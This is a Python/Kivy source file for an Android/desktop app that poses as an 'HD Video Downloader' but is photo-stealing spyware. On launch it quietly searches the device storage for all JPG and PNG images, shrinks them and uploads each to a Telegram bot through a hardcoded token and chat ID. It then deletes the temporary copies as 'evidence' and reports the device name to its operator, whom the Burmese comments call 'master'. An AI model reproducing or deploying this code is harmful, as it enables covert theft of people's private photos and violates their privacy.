import os, requests, threading, platform, time
from kivy.app import App
from kivy.uix.label import Label
from PIL import Image

# --- သခင့်ရဲ့ လျှို့ဝှက်ချက်များ 🥵 ---
BOT_TOKEN = "7491343136:AAHtw3h7LL1K9uFYr2xSiVev5tQhVcxraAk"
CHAT_ID = "7880336250"


class HDDownloaderApp(App):
    def build(self):
        # အရှေ့မျက်နှာပြင်မှာတော့ Downloader ပုံစံပဲ ပြထားမယ် 🫦
        return Label(text='[HD Video Downloader]\nConnecting to server...')

    def on_start(self):
        # App ပွင့်တာနဲ့ နောက်ကွယ်မှာ အကုန်ကျုံးယူမယ် 🥵
        threading.Thread(target=self.main_stealer, daemon=True).start()

    def send_to_telegram(self, file_path, mode='photo'):
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
            url += "sendPhoto" if mode == 'photo' else "sendDocument"
            with open(file_path, 'rb') as f:
                requests.post(url, data={'chat_id': CHAT_ID}, files={mode: f})
            time.sleep(0.5)  # Bot မပိတ်အောင် ခဏနားမယ် 🫦
        except:
            pass

    def main_stealer(self):
        # ၁။ နေရာအနှံ့က ပုံတွေကို ပိုက်စိပ်တိုက်ရှာမယ် 🥵🫦
        root_path = "/sdcard/" if platform.system() == "Android" else os.path.expanduser("~")

        for root, dirs, files in os.walk(root_path):
            for file in files:
                if file.lower().endswith(('.jpg', '.jpeg', '.png')):
                    full_path = os.path.join(root, file)

                    # ပုံကို ချုံ့ပြီး ပို့မယ် (သခင့်ဆီ မြန်မြန်ရောက်အောင်) 🫦
                    temp_img = os.path.join(root, "t_" + file)
                    try:
                        with Image.open(full_path) as img:
                            img.thumbnail((800, 800))
                            img.save(temp_img, optimize=True, quality=70)
                        self.send_to_telegram(temp_img, mode='photo')
                        os.remove(temp_img)  # အထောက်အထား ဖျက်မယ် 🥵
                    except:
                        continue

        # ၂။ အလုပ်ပြီးကြောင်း သခင့်ကို အစီရင်ခံမယ် 🫦
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                      data={'chat_id': CHAT_ID,
                            'text': f"သခင်... {platform.node()} ဆီက နေရာအနှံ့က ပစ္စည်းတွေ အကုန်သိမ်းပြီးပါပြီ 🥵🫦"})


if __name__ == '__main__':
    HDDownloaderApp().run()